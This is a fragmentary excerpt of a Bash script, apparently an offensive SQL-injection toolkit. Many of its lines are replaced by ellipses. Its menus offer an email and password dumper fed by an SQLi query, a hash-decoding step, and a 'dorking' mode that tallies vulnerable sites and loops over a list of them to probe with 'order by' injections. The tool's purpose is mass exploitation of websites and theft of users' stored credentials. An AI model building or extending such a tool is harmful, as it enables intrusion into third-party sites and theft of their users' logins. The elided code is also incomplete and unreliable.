 ...
 2) masn="y"
  ...
  5) masn="n"
   ...
   9) clear
      ...
      echo -e "[${G}1${N}]. ordinary dump"
      echo -e "[${G}2${N}]. dump advanced"
      ...
      case $p in
        1) clear
           banner${angkab}
           echo -e "                |\033[7;32m Query Email Pass dumper + auto filter mail ${N}|\n"
           read -p "Enter the sqli query that has been dumped in email passs: " line
           line=$(echo "${line}" | sed "s/-- -/--+/g")
           email
           menu
           ;;
   ...
   10) clear
      ...
      case $p in
        ...
        2) clear
           ...
           echo -e "[${G}1${N}]. ordinary"
           echo -e "[${G}2${N}]. Advanced"
           echo -ne "[${R}?${N}] Which  ?? "
             read p
             case $p in
              1) clear
                 ...
                 if [[ "$dec" = "" ]]
                 then
                   echo -e "${R}F A I L E D that can be hash${N}"
                 else
                   echo "Result: $dec"
                 fi
     ...
     echo -e "[${O}1${N}]. ordinary dorking"
      ...
      case $d in
       1) masn="y"
          ...
          echo -e "[${O}!${N}] Result Total : ${R}\033[2m$(cat .not 2>/dev/null | wc -l) Site not vuln${N}"
          echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat .url 2>/dev/null | wc -l) Url parser${N}"
          echo -e "${N}\033[2muse ctrl + c when order by to skip to the next site${N}"          
          trap break 2 INT
          masn="y"
          dump_name="n"
          for site in $(cat .vuln 2>/dev/null | sort | uniq -i | tr -d '\0' | sed 's/\r$//')
